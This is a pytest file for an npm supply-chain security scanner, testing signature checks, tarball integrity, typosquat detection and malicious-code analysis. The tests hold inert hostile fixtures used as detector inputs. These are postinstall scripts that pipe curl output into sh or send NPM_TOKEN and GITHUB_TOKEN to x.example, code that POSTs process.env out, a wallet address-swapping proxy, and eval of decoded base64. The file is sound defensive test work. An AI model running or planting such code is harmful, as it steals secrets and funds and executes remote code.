import json, base64, copy
from pathlib import Path
import pytest
from portcullis.supplychain import npm

RAW = Path(__file__).resolve().parents[1] / "data/raw/npm"
META = {p.stem: json.loads(p.read_text()) for p in (RAW / "latest").glob("*.json")}
KEYS = npm.load_keys()


def test_real_signatures_verify():
    checked = [m for m in META.values() if m.get("dist", {}).get("signatures")]
    assert len(checked) >= 35
    bad = [m["name"] for m in checked if not npm.verify_signature(m, KEYS)]
    assert bad == []


def test_tampered_integrity_breaks_signature():
    m = copy.deepcopy(META["chalk"])
    m["dist"]["integrity"] = m["dist"]["integrity"][:-4] + "AAAA"
    assert not npm.verify_signature(m, KEYS)


def test_tampered_version_breaks_signature():
    m = copy.deepcopy(META["chalk"])
    m["version"] = "9.9.9"
    assert not npm.verify_signature(m, KEYS)


def test_real_tarballs_match_integrity():
    tarballs = list((RAW / "tarballs").glob("*.tgz"))
    assert len(tarballs) == 10
    for t in tarballs:
        name, ver = t.stem.rsplit("-", 1)
        meta = next(m for m in META.values() if m["name"] == name and m["version"] == ver)
        assert npm.verify_integrity(meta, t.read_bytes()), t.name


def test_flipped_tarball_byte_detected():
    t = next((RAW / "tarballs").glob("chalk-*.tgz"))
    data = bytearray(t.read_bytes()); data[-20] ^= 1
    meta = META["chalk"]
    assert any(f.rule == "integrity-mismatch" for f in npm.verify_package(meta, bytes(data), KEYS))


def test_real_tarballs_known_clean():
    for t in (RAW / "tarballs").glob("*.tgz"):
        fs = npm.analyze_tarball(t.read_bytes(), t.stem)
        assert [f for f in fs if f.severity in ("high", "critical")] == [], (t.name, fs)


def test_real_install_scripts_not_critical():
    for name, m in META.items():
        fs = npm.analyze_scripts(m, name)
        assert not [f for f in fs if f.severity in ("high", "critical")], (name, fs)


def test_malicious_scripts_flagged():
    fs = npm.analyze_scripts({"scripts": {"postinstall": "curl -s http://x.example/a.sh | sh"}}, "evil")
    assert fs[0].rule == "install-script-remote-exec" and fs[0].severity == "critical"
    fs = npm.analyze_scripts({"scripts": {"postinstall": "node -e \"require('https').get('http://x.example/?'+process.env.NPM_TOKEN)\" ; curl x $GITHUB_TOKEN"}}, "evil")
    assert any(f.severity in ("critical", "medium") for f in fs)


def test_typosquat():
    assert npm.typosquat("expres") == "express"
    assert npm.typosquat("cross_env") == "cross-env"
    assert npm.typosquat("lodash") is None
    assert npm.typosquat("totally-unrelated-name") is None


def test_real_popular_names_not_squats_of_each_other():
    pop = npm.popular_names()
    hits = {n: npm.typosquat(n, [p for p in pop if p != n]) for n in pop}
    # report, but real popular pairs (e.g. mysql/mysql2, ora/pora) may collide; keep it small
    assert sum(1 for v in hits.values() if v) <= 6, {k: v for k, v in hits.items() if v}


def test_typosquat_transposition():
    assert npm.typosquat("lodahs") == "lodash"
    assert npm.typosquat("raect") == "react"


def _src(name):
    return {
        "obf": "var _0xa1b2=['a'],_0xb2c3=['b'],_0xc3d4=['c'],_0xd4e5=['d'],_0xe5f6=['e'];" + "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c",
        "swap": "const A='0x" + "a1" * 20 + "',B='0x" + "b2" * 20 + "';window.ethereum.request=new Proxy(window.ethereum.request,{apply(t,th,a){return t.apply(th,JSON.parse(JSON.stringify(a).replace(/0x[a-f0-9]{40}/g,B)))}});",
        "evalb": "eval(atob('Y29uc29sZS5sb2coMSk='))",
        "exfil": "const https=require('https');const d=JSON.stringify(process.env);https.request('https://x.example/c',{method:'POST'}).end(d);",
    }[name]


def test_inert_malicious_fixtures_are_flagged():
    assert "obfuscated-code" in {f.rule for f in npm.analyze_source(_src("obf"), "a.js")}
    assert "address-swap" in {f.rule for f in npm.analyze_source(_src("swap"), "a.js")}
    assert "eval-decoded" in {f.rule for f in npm.analyze_source(_src("evalb"), "a.js")}
    assert "env-exfil" in {f.rule for f in npm.analyze_source(_src("exfil"), "a.js")}


def test_benign_source_is_not_flagged():
    ok = "const x = process.env.NODE_ENV; module.exports = { x };"
    assert npm.analyze_source(ok, "a.js") == []
